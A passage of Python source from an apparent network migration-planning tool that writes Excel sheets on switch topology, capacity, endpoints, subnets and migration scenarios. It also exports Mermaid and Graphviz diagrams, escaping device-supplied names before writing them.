    """Write (or replace) 'Move Groups': one row per migration wave (connected component
    of the shared-VLAN graph), ordered largest-coupling first."""
    cols = ["Group", "# Switches", "Switches", "# Spanning VLANs", "Spanning VLANs",
            "# Endpoint MACs (per-switch sum)", "Gateways", "Redundant (STP-blocked) Paths", "Notes"]
    if MOVEGROUP_SHEET_NAME in wb.sheetnames:
        del wb[MOVEGROUP_SHEET_NAME]
    ws = _new_sheet(wb, MOVEGROUP_SHEET_NAME)
    _census_header(ws, cols)

    groups = compute_move_groups(all_interfaces)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)

    r = 2
    for i, g in enumerate(groups, 1):
        span_txt = ", ".join(f"{vid}{'('+name+')' if name else ''}[x{n}]"
                             for vid, name, n in g["spanning_vlans"])
        notes = []
        if len(g["switches"]) == 1:
            notes.append("Standalone — migrate independently, any order")
        else:
            notes.append("Migrate together — shared L2 broadcast domain(s)")
        if g["vlan1_spans"]:
            notes.append("VLAN 1 also spans group (default, excluded from grouping)")
        if g["blocked_paths"]:
            notes.append("Has redundant blocked path(s) — verify before cutover")
        vals = [f"Group {i}", len(g["switches"]), ", ".join(g["switches"]),
                len(g["spanning_vlans"]), span_txt, g["endpoints"],
                ", ".join(g["gateways"]), "; ".join(g["blocked_paths"]), " | ".join(notes)]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    # widen the two free-text columns
    ws.column_dimensions["E"].width = 40
    ws.column_dimensions["I"].width = 48
    logger.info(f"  [OK] '{MOVEGROUP_SHEET_NAME}' sheet: {len(groups)} group(s)")


TOPOLOGY_SHEET_NAME = "Topology Links"

def write_topology_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write (or replace) 'Topology Links': one row per physical inter-switch link,
    discovered from CDP/LLDP and de-duplicated across both endpoints' views."""
    cols = ["Switch A", "Port A", "Switch B", "Port B", "Neighbor Platform",
            "Link Speed", "Confirmation"]
    if TOPOLOGY_SHEET_NAME in wb.sheetnames:
        del wb[TOPOLOGY_SHEET_NAME]
    ws = _new_sheet(wb, TOPOLOGY_SHEET_NAME)
    _census_header(ws, cols)

    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    ordered = compute_topology_links(all_interfaces)   # V3.15.0: shared link builder
    r = 2
    for rec in ordered:
        vals = [rec["a_host"], rec["a_port"], rec["b_host"], rec["b_port"],
                rec["platform"], rec["speed"], rec["confirmation"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{TOPOLOGY_SHEET_NAME}' sheet: {len(ordered)} link(s)")


FINDINGS_SHEET_NAME = "Findings"

def write_findings_sheet(wb, all_interfaces: Dict[str, Dict[str, InterfaceData]]) -> None:
    """Write (or replace) 'Findings': a risk register cross-referenced from the
    interface DB. Empty when nothing notable is found."""
    cols = ["Severity", "Category", "Scope", "Finding"]
    if FINDINGS_SHEET_NAME in wb.sheetnames:
        del wb[FINDINGS_SHEET_NAME]
    ws = _new_sheet(wb, FINDINGS_SHEET_NAME)
    _census_header(ws, cols)
    findings = compute_findings(all_interfaces)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="top", wrap_text=True)
    sev_fill = {"High": PatternFill("solid", fgColor="F4CCCC"),
                "Medium": PatternFill("solid", fgColor="FCE5CD"),
                "Low": PatternFill("solid", fgColor="FFF2CC"),
                "Info": PatternFill("solid", fgColor="EFEFEF")}
    r = 2
    for sev, cat, scope, detail in findings:
        for col, v in enumerate([sev, cat, scope, detail], 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT; c.alignment = DAT_L
            if col == 1 and sev in sev_fill: c.fill = sev_fill[sev]
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["D"].width = 70
    logger.info(f"  [OK] '{FINDINGS_SHEET_NAME}' sheet: {len(findings)} finding(s)")


CAPACITY_SHEET_NAME = "Capacity"

def _to_float(s) -> Optional[float]:
    m = re.search(r"-?\d+(?:\.\d+)?", str(s or ""))
    return float(m.group(0)) if m else None

def compute_capacity(all_device_physical: List[DevicePhysical]) -> List[dict]:
    """Per-switch port + PoE headroom for consolidation decisions (the single source of truth for the
    'Capacity' sheet AND the explorer's capacity card). One record per device, sorted by hostname:
    {hostname, model, total_ports, active_ports, free_ports, port_util, poe_capacity_w, poe_drawn_w,
     poe_remaining_w, poe_util, flags}. Numeric fields are "" when unknown (so the sheet renders blanks
     exactly as before); flags is a list of "Port-bound (>=90%)" / "PoE-bound (>=80%)".

    For active_ports, "" means NOT OBSERVED and only that (review #55). An OBSERVED zero is a fact and
    renders as 0: the old `active or ""` collapsed it into the same blank the docstring reserves for
    unknown, while still emitting a computed 0.0% utilisation and free_ports == total_ports for that
    same row -- two contradictory coverage claims in one row of the sheet consolidation decisions are
    made on. The None-vs-0 distinction the line below draws is now kept all the way to the record.
    (total_ports is NOT the same case and is left alone: model.DevicePhysical declares it `int = 0`
    with no None state, so 0 there IS the not-observed marker, not an observed zero.)"""
    out: List[dict] = []
    for dp in sorted(all_device_physical, key=lambda d: d.hostname.lower()):
        total = dp.total_ports or 0                           # 0 = no port inventory parsed (the field has no None)
        active = dp.active_ports                              # None = active-port count NOT observed (distinct from 0)
        # honesty: a device whose active-port count was not observed must NOT read 0% utilization — it would
        # then rank first as "most consolidation headroom". Leave util/free blank when active_ports is unknown.
        free = max(total - active, 0) if (total and active is not None) else ""
        putil = round(100.0 * active / total, 1) if (total and active is not None) else ""
        cap, drawn = _to_float(dp.power_capacity_w), _to_float(dp.power_drawn_w)
        if dp.power_remaining_w:
            rem = dp.power_remaining_w
        elif cap is not None and drawn is not None:
            rem = round(cap - drawn, 1)
        else:
            rem = ""
        poe_util = round(100.0 * drawn / cap, 1) if (cap and drawn is not None and cap > 0) else ""
        flags = []
        if putil != "" and putil >= 85: flags.append("Port-bound (>=85%)")   # match design_advisor._PORT_UTIL_HOT=85 so workbook + design narrative agree (DET-capacity-04)
        if poe_util != "" and poe_util >= 80: flags.append("PoE-bound (>=80%)")
        out.append({"hostname": dp.hostname, "model": dp.model,
                    "total_ports": total or "",
                    "active_ports": "" if active is None else active, "free_ports": free,
                    "port_util": putil, "poe_capacity_w": dp.power_capacity_w,
                    "poe_drawn_w": dp.power_drawn_w, "poe_remaining_w": rem,
                    "poe_util": poe_util, "flags": flags})
    return out


def write_capacity_sheet(wb, all_device_physical: List[DevicePhysical]) -> None:
    """Write (or replace) 'Capacity': per-switch port and PoE headroom for
    consolidation decisions. Flags switches that are port- or PoE-bound.
    Renders the records from compute_capacity (one source of truth with the explorer)."""
    cols = ["Hostname", "Model", "Total Ports", "Active Ports", "Free Ports",
            "Port Util %", "PoE Capacity (W)", "PoE Drawn (W)", "PoE Remaining (W)",
            "PoE Util %", "Flag"]
    if CAPACITY_SHEET_NAME in wb.sheetnames:
        del wb[CAPACITY_SHEET_NAME]
    ws = _new_sheet(wb, CAPACITY_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    DAT_C = Alignment(horizontal="center", vertical="center")
    warn_fill = PatternFill("solid", fgColor="FCE5CD")
    r = 2
    for rec in compute_capacity(all_device_physical):
        flags = rec["flags"]
        # A colour is a claim, so shade the cell the flag is ABOUT -- not both. `if flags and col in (6, 10)`
        # amber-filled Port Util % for a device flagged only PoE-bound, including when that cell is BLANK
        # because active_ports was never observed: an amber "port-bound" claim over an unobserved value, in
        # the same row whose blank exists precisely to withhold that claim (review #55).
        _hot = {6: any(f.startswith("Port-bound") for f in flags),
                10: any(f.startswith("PoE-bound") for f in flags)}
        vals = [rec["hostname"], rec["model"], rec["total_ports"], rec["active_ports"], rec["free_ports"],
                rec["port_util"], rec["poe_capacity_w"], rec["poe_drawn_w"], rec["poe_remaining_w"],
                rec["poe_util"], "; ".join(flags)]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if 3 <= col <= 10 else DAT_L
            if _hot.get(col) and v != "": c.fill = warn_fill
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    logger.info(f"  [OK] '{CAPACITY_SHEET_NAME}' sheet: {len(all_device_physical)} device(s)")


ENDPOINT_INTEL_SHEET_NAME = "Endpoint Intelligence"   # vendor + class per endpoint (NEW-V3.23.95)

def write_endpoint_intelligence_sheet(wb, identity: list) -> None:
    """Write (or replace) 'Endpoint Intelligence': one row per access-port endpoint with its VENDOR
    (MAC OUI -- a fact) and an inferred migration CLASS + confidence + the evidence that drove it.
    NEW-V3.23.95: renders the precomputed compute_endpoint_identity records (one source of truth with
    the snapshot / runbook / explorer). A class-distribution summary is written above the table."""
    # Coerce the SECTION ONCE at entry, not per read site: these writers are handed a raw
    # snapshot section on the --no-collect rebuild, and each reads it in several places (the
    # row loop AND the summary line), so a per-site guard leaves the next read reachable.
    identity = _sec_rows(identity)
    cols = ["Switch", "Port", "VLAN", "Endpoint IP", "MACs", "Vendor (OUI fact)",
            "Class (inferred)", "Confidence", "Evidence"]
    if ENDPOINT_INTEL_SHEET_NAME in wb.sheetnames:
        del wb[ENDPOINT_INTEL_SHEET_NAME]
    ws = _new_sheet(wb, ENDPOINT_INTEL_SHEET_NAME)
    _census_header(ws, cols)
    DAT_FONT = Font(name="Calibri", size=10)
    DAT_L = Alignment(horizontal="left", vertical="center")
    DAT_C = Alignment(horizontal="center", vertical="center")
    low_fill = PatternFill("solid", fgColor="F2F2F2")   # shade Unknown rows so eyes go to classified ones
    r = 2
    for rec in _sec_rows(identity):
        vals = [rec.get("host"), rec.get("port"), rec.get("vlan"), rec.get("ip"),
                rec.get("mac_count"), rec.get("vendor"), rec.get("endpoint_class"),
                rec.get("confidence"), rec.get("evidence")]
        unknown = rec.get("confidence") == "Unknown"
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT_FONT
            c.alignment = DAT_C if col in (3, 5, 8) else DAT_L
            if unknown:
                c.fill = low_fill
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["I"].width = 42
    logger.info(f"  [OK] '{ENDPOINT_INTEL_SHEET_NAME}' sheet: {len(identity)} endpoint(s)")


ENDPOINT_DEPS_SHEET_NAME = "Endpoint Dependencies"   # cohesive units / clusters (NEW-V3.23.96)

def write_endpoint_dependencies_sheet(wb, dependencies: dict) -> None:
    """Write (or replace) 'Endpoint Dependencies': the migration 'cohesive units' -- per (vendor, class)
    distributed system with its endpoint count and switch/VLAN spread, then the dual-homed endpoints
    (NIC-team / redundant legs to sequence make-before-break) and the per-VLAN app tiers. NEW-V3.23.96:
    renders the precomputed compute_endpoint_dependencies dict (one source of truth)."""
    # Coerce the SECTION ONCE at entry, not per read site: these writers are handed a raw
    # snapshot section on the --no-collect rebuild, and each reads it in several places (the
    # row loop AND the summary line), so a per-site guard leaves the next read reachable.
    dependencies = _sec_dict(dependencies)
    if ENDPOINT_DEPS_SHEET_NAME in wb.sheetnames:
        del wb[ENDPOINT_DEPS_SHEET_NAME]
    ws = _new_sheet(wb, ENDPOINT_DEPS_SHEET_NAME)
    cols = ["Section", "Vendor / detail", "Class", "Endpoints", "Switches", "VLANs", "Note"]
    _census_header(ws, cols)
    DAT = Font(name="Calibri", size=10)
    AL = Alignment(horizontal="left", vertical="center")
    CN = Alignment(horizontal="center", vertical="center")
    warn = PatternFill("solid", fgColor="FCE5CD")
    r = 2
    dep = dependencies or {}

    def row(vals, flag=False):
        nonlocal r
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT
            c.alignment = CN if col in (4, 5, 6) else AL
            if flag and col == 7:
                c.fill = warn
        r += 1

    for c in _sec_rows(dep.get("clusters")):
        row(["Cluster", c.get("vendor", ""), c.get("endpoint_class", ""), c.get("count", ""),
             c.get("switches", ""), c.get("vlans", ""),
             "spans multiple move-groups — coordinate the waves" if c.get("spans_groups") else ""],
            flag=c.get("spans_groups"))
    for d in _sec_rows(dep.get("dual_homed")):
        row(["Dual-homed", f"{d.get('mac', '')}  [{', '.join(d.get('switches', []))}]",
             d.get("endpoint_class", ""), 1, len(d.get("switches", [])), "",
             "split across move-groups — sequence make-before-break" if d.get("split_across_groups")
             else "NIC-team / redundant legs — make-before-break"],
            flag=d.get("split_across_groups"))
    for a in _sec_rows(dep.get("affinity")):
        cls = ", ".join(f"{k} ({v})" for k, v in (a.get("classes") or {}).items())
        row(["VLAN tier", f"VLAN {a.get('vlan', '')}: {cls}", a.get("dominant", ""),
             a.get("total", ""), "", a.get("vlan", ""), ""])
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["B"].width = 48; ws.column_dimensions["G"].width = 46
    n = (len(_sec_rows(dep.get("clusters"))) + len(_sec_rows(dep.get("dual_homed")))
         + len(_sec_rows(dep.get("affinity"))))
    logger.info(f"  [OK] '{ENDPOINT_DEPS_SHEET_NAME}' sheet: {n} dependency row(s)")


SUBNET_REACH_SHEET_NAME = "Subnet Reachability"   # per-device subnet source/destination (NEW-V3.23.97)

def write_subnet_reachability_sheet(wb, subnet_intelligence: dict) -> None:
    """Write (or replace) 'Subnet Reachability': per device, which subnets it is the DESTINATION for
    (terminates / gateways) vs can REACH (route table) vs -- for an L2 access switch -- which subnets
    its endpoints live in (via the SVI that gateways their VLAN). NEW-V3.23.97: renders the precomputed
    compute_subnet_intelligence (one source of truth). Route depth is from the full 'show ip route';
    BGP-received is populated only when the new 'show ip bgp' collection is present."""
    # Coerce the SECTION ONCE at entry, not per read site: these writers are handed a raw
    # snapshot section on the --no-collect rebuild, and each reads it in several places (the
    # row loop AND the summary line), so a per-site guard leaves the next read reachable.
    subnet_intelligence = _sec_dict(subnet_intelligence)
    if SUBNET_REACH_SHEET_NAME in wb.sheetnames:
        del wb[SUBNET_REACH_SHEET_NAME]
    ws = _new_sheet(wb, SUBNET_REACH_SHEET_NAME)
    cols = ["Switch", "Role", "Destination subnets (terminates)", "# Dest", "Reachable (#)",
            "Reachable sources", "Default next-hop", "L2: subnets via gateway", "BGP recv (#)"]
    _census_header(ws, cols)
    DAT = Font(name="Calibri", size=10)
    AL = Alignment(horizontal="left", vertical="top", wrap_text=True)
    CN = Alignment(horizontal="center", vertical="center")
    r = 2
    for rec in _sec_rows(subnet_intelligence.get("per_device")):
        dest = rec.get("destination_subnets", [])
        srcs = ", ".join(f"{k}:{v}" for k, v in (rec.get("reachable_sources") or {}).items())
        # DISCLOSE the cut, exactly as the destination-subnet join two lines below does. This column is an
        # access switch's whole answer to "which subnets do my endpoints live in" -- a migration-scoping
        # fact -- and it was silently amputated at 8 while the row's own '# Dest' cell and column C both
        # carried honest totals. A silent truncation is a coverage lie, not a display nicety; this module's
        # cell-cap guard cites THIS sheet's '(+N)' pattern as the house rule (see _xls_cell_value).
        _served = _sec_rows(rec.get("served_subnets"))
        served = "; ".join(f"{s.get('subnet')} (gw {s.get('gateway')})" for s in _served[:8]) \
            + (f" (+{len(_served) - 8})" if len(_served) > 8 else "")
        vals = [rec.get("host"), "L3" if rec.get("is_l3") else "L2",
                ", ".join(dest[:12]) + (f" (+{len(dest) - 12})" if len(dest) > 12 else ""),
                rec.get("destination_count", 0), rec.get("reachable_count", 0), srcs,
                rec.get("default_next_hop", ""), served, rec.get("bgp_received_count", 0)]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT
            c.alignment = CN if col in (2, 4, 5, 9) else AL
        r += 1
    _census_autofit(ws, len(cols), r - 1)
    ws.column_dimensions["C"].width = 40; ws.column_dimensions["H"].width = 44
    logger.info(f"  [OK] '{SUBNET_REACH_SHEET_NAME}' sheet: "
                f"{len(_sec_rows(subnet_intelligence.get('per_device')))} device(s)")


MIGRATION_SCENARIO_SHEET_NAME = "Migration Scenarios"   # per-group cutover scenario (NEW-V3.23.98)

def write_migration_scenarios_sheet(wb, scenarios: dict) -> None:
    """Write (or replace) 'Migration Scenarios': per move-group, the recommended cutover scenario
    (phased / parallel-run / greenfield / big-bang) + rationale + dual-homing split, with the
    fleet-level recommendation in row 1. NEW-V3.23.98: renders compute_migration_scenarios."""
    if MIGRATION_SCENARIO_SHEET_NAME in wb.sheetnames:
        del wb[MIGRATION_SCENARIO_SHEET_NAME]
    ws = _new_sheet(wb, MIGRATION_SCENARIO_SHEET_NAME)
    sc = scenarios or {}
    fleet = sc.get("fleet_recommendation", "")
    if fleet:
        ws.cell(row=1, column=1, value="Fleet recommendation:").font = Font(bold=True, size=10)
        c = ws.cell(row=1, column=2, value=fleet); c.font = Font(size=10)
        c.alignment = Alignment(horizontal="left", vertical="center", wrap_text=True)
    hdr_row = 3 if fleet else 1
    cols = ["Move group", "Switches", "Endpoint MACs (per-switch sum)", "Readiness", "Dual-homed %", "Hard cutovers",
            "At-risk eps", "Recommended scenario", "Rationale"]
    for i, h in enumerate(cols, 1):
        cell = ws.cell(row=hdr_row, column=i, value=h)
        cell.font = Font(bold=True, color="FFFFFF", size=10); cell.fill = PatternFill("solid", fgColor="434343")
        cell.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(row=hdr_row + 1, column=1)
    SCFILL = {"parallel-run": "D9EAD3", "phased": "FFF2CC", "greenfield": "CFE2F3", "big-bang": "F4CCCC"}
    DAT = Font(name="Calibri", size=10)
    r = hdr_row + 1
    for g in sc.get("per_group", []):
        vals = [g.get("group") or "(group)", g.get("switches"), g.get("endpoints"), g.get("readiness"),
                g.get("dual_homed_pct"), g.get("hard_cutover"), g.get("hard_cutover_endpoints"),
                g.get("recommended_scenario"), g.get("rationale")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(row=r, column=col, value=v); c.font = DAT
            c.alignment = Alignment(horizontal="center" if 2 <= col <= 8 else "left",
                                    vertical="top", wrap_text=(col == 9))
            if col == 8:
                c.fill = PatternFill("solid", fgColor=SCFILL.get(v, "FFFFFF"))
        r += 1
    for colL, w in (("A", 16), ("I", 70)):
        ws.column_dimensions[colL].width = w
    logger.info(f"  [OK] '{MIGRATION_SCENARIO_SHEET_NAME}' sheet: {len(sc.get('per_group', []))} group(s)")


APPLICATION_INTEL_SHEET_NAME = "Application Intelligence"   # application-domain synthesis (NEW-V3.23.112)

def write_application_intelligence_sheet(wb, ai: dict) -> None:
    """Write (or replace) 'Application Intelligence' from compute_application_intelligence(): the
    application DOMAINS (workloads) with footprint, criticality tier, health rollup, migration-wave
    span, top migration risk + standard + the evidence that placed each switch, followed by a
    cross-domain (IGMP querier continuity / RFC 4541) risk block. NEW-V3.23.112."""
    if APPLICATION_INTEL_SHEET_NAME in wb.sheetnames:
        del wb[APPLICATION_INTEL_SHEET_NAME]
    ws = _new_sheet(wb, APPLICATION_INTEL_SHEET_NAME)
    a = ai or {}
    s = a.get("summary") or {}
    summ = (f"{s.get('n_domains', 0)} domain(s)  ·  {s.get('n_on_air_critical', 0)} on-air-critical  ·  "
            f"{s.get('n_high_risk', 0)} with High/Critical risk  ·  {s.get('n_spanning_waves', 0)} span >1 wave  ·  "
            f"{s.get('n_cross_domain_risks', 0)} cross-domain risk(s)")
    ws.cell(row=1, column=1, value="Application & network intelligence:").font = Font(bold=True, size=10)
    c0 = ws.cell(row=1, column=2, value=summ); c0.font = Font(size=10)
    c0.alignment = Alignment(horizontal="left", vertical="center", wrap_text=True)

    hdr_row = 3
    cols = ["Domain", "Tier", "Switches", "VLANs", "Endpoints", "Top endpoint classes", "PTP",
            "Worst health", "Waves", "Risks", "Top risk", "Standard", "Why (evidence)"]
    for i, h in enumerate(cols, 1):
        cell = ws.cell(row=hdr_row, column=i, value=h)
        cell.font = Font(bold=True, color="FFFFFF", size=10); cell.fill = PatternFill("solid", fgColor="434343")
        cell.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(row=hdr_row + 1, column=1)
    TIERFILL = {"On-air critical": "F4CCCC", "Production": "FFF2CC", "Support": "D9EAD3"}
    DAT = Font(name="Calibri", size=10)
    r = hdr_row + 1
    for d in a.get("domains", []):
        classes = ", ".join(f"{k} ({v})" for k, v in (d.get("classes") or {}).items())
        ptp = ("boundary-clocked" if d.get("ptp_boundary_clocked")
               else "present, NOT BC" if d.get("ptp_present") else "—")
        hh = d.get("health") or {}
        hstr = (hh.get("worst_band", "") or "—") + (
            f" ({hh.get('n_critical', 0)}C/{hh.get('n_poor', 0)}P)"
            if (hh.get("n_critical") or hh.get("n_poor")) else "")
        waves = ", ".join(d.get("waves") or []) or "—"
        risks = d.get("risks") or []
        toprisk = f"{risks[0]['severity']}: {risks[0]['title']}" if risks else "—"
        vals = [d.get("domain"), d.get("tier"), d.get("switch_count"), d.get("vlan_count"),
                d.get("endpoint_count"), classes or "—", ptp, hstr, waves, len(risks), toprisk,
                d.get("standard", "") or "—", d.get("evidence", "")]
        for col, v in enumerate(vals, 1):
            cc = ws.cell(row=r, column=col, value=v); cc.font = DAT
            cc.alignment = Alignment(horizontal="center" if col in (3, 4, 5, 7, 9, 10) else "left",
                                     vertical="top", wrap_text=col in (6, 11, 13))
            if col == 2:
                cc.fill = PatternFill("solid", fgColor=TIERFILL.get(v, "FFFFFF"))
        r += 1

    cross = a.get("cross_domain_risks") or []
    r += 1
    ws.cell(row=r, column=1,
            value="Cross-domain risks — IGMP querier continuity (RFC 4541)").font = Font(bold=True); r += 1
    if not cross:
        ws.cell(row=r, column=1, value="None detected."); r += 1
    else:
        for i, h in enumerate(["Severity", "Kind", "VLAN", "Detail", "Remediation", "Standard"], 1):
            cell = ws.cell(row=r, column=i, value=h); cell.font = Font(bold=True, size=10)
        r += 1
        for cr in cross:
            vals = [cr.get("severity"), cr.get("kind"), cr.get("vlan"), cr.get("detail"),
                    cr.get("remediation"), cr.get("standard")]
            for col, v in enumerate(vals, 1):
                cc = ws.cell(row=r, column=col, value=v); cc.font = DAT
                cc.alignment = Alignment(horizontal="left", vertical="top", wrap_text=col in (4, 5))
            r += 1

    # Inter-domain dependency block (NEW-V3.23.113): the coupling edges + the keystone domain.
    edges = a.get("edges") or []
    keystones = a.get("keystones") or []
    r += 1
    ws.cell(row=r, column=1, value="Inter-domain dependencies (couplings)").font = Font(bold=True); r += 1
    if keystones:
        k = keystones[0]
        ws.cell(row=r, column=1, value="Keystone (widest blast radius):").font = Font(size=10)
        ws.cell(row=r, column=2,
                value=f"{k.get('domain')} — degree {k.get('degree')}, {len(k.get('neighbors') or [])} neighbour(s)")
        r += 1
    if not edges:
        ws.cell(row=r, column=1, value="No cross-domain couplings detected."); r += 1
    else:
        for i, h in enumerate(["Domain A", "Domain B", "Weight", "Kinds", "Confidence", "Migration note"], 1):
            cell = ws.cell(row=r, column=i, value=h); cell.font = Font(bold=True, size=10)
        r += 1
        for e in edges:
            vals = [e.get("source"), e.get("target"), e.get("weight"), ", ".join(e.get("kinds") or []),
                    e.get("confidence"),
                    e.get("migration_note") or ("media-adjacent" if e.get("media") else "")]
            for col, v in enumerate(vals, 1):
                cc = ws.cell(row=r, column=col, value=v); cc.font = DAT
                cc.alignment = Alignment(horizontal="left" if col in (1, 2, 4, 5, 6) else "center",
                                         vertical="top", wrap_text=col in (4, 6))
            r += 1

    # Recommended cutover order block (NEW-V3.23.114): the domains ordered lowest-risk pilot first.
    order = a.get("cutover_order") or []
    if order:
        r += 1
        ws.cell(row=r, column=1,
                value="Recommended cutover order (lowest-risk pilot first)").font = Font(bold=True); r += 1
        for i, h in enumerate(["#", "Band", "Domain", "Tier", "Score", "Rationale"], 1):
            cell = ws.cell(row=r, column=i, value=h); cell.font = Font(bold=True, size=10)
        r += 1
        BANDFILL = {"Pilot": "D9EAD3", "Early": "E2EFDA", "Mid": "FFF2CC", "Late": "FCE4D6", "Last": "F4CCCC"}
        for c in order:
            vals = [c.get("order"), c.get("band"), c.get("domain"), c.get("tier"), c.get("score"),
                    c.get("rationale")]
            for col, v in enumerate(vals, 1):
                cc = ws.cell(row=r, column=col, value=v); cc.font = DAT
                cc.alignment = Alignment(horizontal="center" if col in (1, 5) else "left",
                                         vertical="top", wrap_text=col == 6)
                if col == 2:
                    cc.fill = PatternFill("solid", fgColor=BANDFILL.get(v, "FFFFFF"))
            r += 1

    for i, w in enumerate([34, 15, 9, 7, 10, 26, 16, 14, 12, 7, 40, 24, 34], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{APPLICATION_INTEL_SHEET_NAME}' sheet: {len(a.get('domains', []))} domain(s), "
                f"{len(cross)} cross-domain risk(s), {len(edges)} dependency edge(s), "
                f"{len(order)} cutover step(s)")


def _mermaid_id(name: str, idmap: Dict[str, str]) -> str:
    if name not in idmap:
        idmap[name] = f"n{len(idmap)}"
    return idmap[name]


#: Whitespace that must never survive into a one-line diagram statement: a raw newline in a
#: device-advertised name INJECTS statements into both the .mmd and the .dot.
_DIAG_WS_RE = re.compile(r"[\r\n\t\v\f]+")


def _mermaid_text(value) -> str:
    """Escape a device-advertised string for a Mermaid QUOTED label (review #64).

    `analyze.compute_topology_links` keeps the RAW advertised CDP/LLDP name for any off-scan
    neighbour, so a_host / b_host / b_port are fully DEVICE-CONTROLLED, and these files are written
    with a plain `open()/write()` -- neither `_xls_sanitize` nor `xml_safe` runs on them. A double
    quote closes the label early, `[`/`]` close the node-shape bracket, `|` closes an edge label, and
    a newline injects whole statements -- all while the writer logs `[OK]`. Mermaid's escape for these
    is the HTML-style numeric entity, which renders as the original character."""
    s = _DIAG_WS_RE.sub(" ", str("" if value is None else value))
    # ';' (Mermaid's statement separator) is escaped FIRST — every entity below ENDS in ';', so doing it
    # last would re-escape the ones just inserted ('#quot;' -> '#quot#59;').
    for ch, ent in ((";", "#59;"), ('"', "#quot;"), ("[", "#91;"), ("]", "#93;"),
                    ("{", "#123;"), ("}", "#125;"), ("|", "#124;")):
        s = s.replace(ch, ent)
    return s


def _dot_text(value) -> str:
    """Escape a device-advertised string for a Graphviz DOUBLE-QUOTED string (review #64). Same
    untrusted source as _mermaid_text; DOT's escape is the backslash (escape the backslash FIRST, or
    a trailing one would escape the closing quote)."""
    s = _DIAG_WS_RE.sub(" ", str("" if value is None else value))
    return s.replace("\\", "\\\\").replace('"', '\\"')

def write_topology_diagram(all_interfaces: Dict[str, Dict[str, InterfaceData]],
                           out_dir: str, basename: str = "topology") -> List[str]:
    """Emit the inter-switch link map as Mermaid (.mmd) and Graphviz (.dot) files.
    One-end-only links are drawn dashed. Returns the two file paths."""
    links = compute_topology_links(all_interfaces)
    os.makedirs(out_dir, exist_ok=True)
    nodes = set()
    for L in links:
        nodes.add(str(L["a_host"])); nodes.add(str(L["b_host"]))

    idmap: Dict[str, str] = {}
    mm = ["graph LR"]
    for n in sorted(nodes):
        mm.append(f'    {_mermaid_id(n, idmap)}["{_mermaid_text(n)}"]')
    for L in links:
        a, b = _mermaid_id(str(L["a_host"]), idmap), _mermaid_id(str(L["b_host"]), idmap)
        lbl = f'{_mermaid_text(L["a_port"])} - {_mermaid_text(L.get("b_port") or "?")}'
        edge = "-.-" if str(L["confirmation"]).startswith("One end") else "---"
        mm.append(f'    {a} {edge}|"{lbl}"| {b}')
    mm_path = os.path.join(out_dir, basename + ".mmd")
    with open(mm_path, "w", encoding="utf-8") as f:
        f.write("\n".join(mm) + "\n")

    dot = ["graph topology {", "    rankdir=LR;", "    node [shape=box, fontsize=10];"]
    for L in links:
        style = ' style="dashed"' if str(L["confirmation"]).startswith("One end") else ""
        lbl = f'{_dot_text(L["a_port"])}\\n{_dot_text(L.get("b_port") or "?")}'
        dot.append(f'    "{_dot_text(L["a_host"])}" -- "{_dot_text(L["b_host"])}" [label="{lbl}"{style}];')
    dot.append("}")
    dot_path = os.path.join(out_dir, basename + ".dot")
    with open(dot_path, "w", encoding="utf-8") as f:
        f.write("\n".join(dot) + "\n")

    logger.info(f"  [OK] Topology diagram: {mm_path} , {dot_path} "
                f"({len(links)} link(s), {len(nodes)} node(s))")
    return [mm_path, dot_path]


# =============================================================================
# Health / analysis sheet writers (PHASE 2.7 step 23): render already-computed
# records (main() computes via the analyze layer and passes them in). _SEV_FILL is
# the shared severity fill-colour map (also used by the causality/failure/physical
# writers still in the monolith, which import it back).
# =============================================================================
_SEV_FILL = {"High": "F4CCCC", "Medium": "FCE5CD", "Low": "FFF2CC", "Info": "EFEFEF"}

CROSS_LAYER_SHEET_NAME = "Cross-Layer Analysis"
_CL_FILL = {"Critical": "FF5775", "High": "F4CCCC", "Medium": "FCE5CD", "Low": "FFF2CC", "Info": "EFEFEF"}

def write_cross_layer_sheet(wb, findings: List[dict]) -> None:
    """Write the 'Cross-Layer Analysis' sheet from compute_cross_layer_correlations()."""

    ws = _new_sheet(wb, CROSS_LAYER_SHEET_NAME)
    headers = ["CL", "Severity", "Layers", "Finding", "Detail", "Recommendation"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    for r, f in enumerate(findings, 2):
        vals = [f["id"], f["severity"], f["layers"], f["title"], f["detail"], f["recommendation"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == 2 and f["severity"] in _CL_FILL:
                c.fill = PatternFill("solid", fgColor=_CL_FILL[f["severity"]])
                c.font = Font(bold=True)
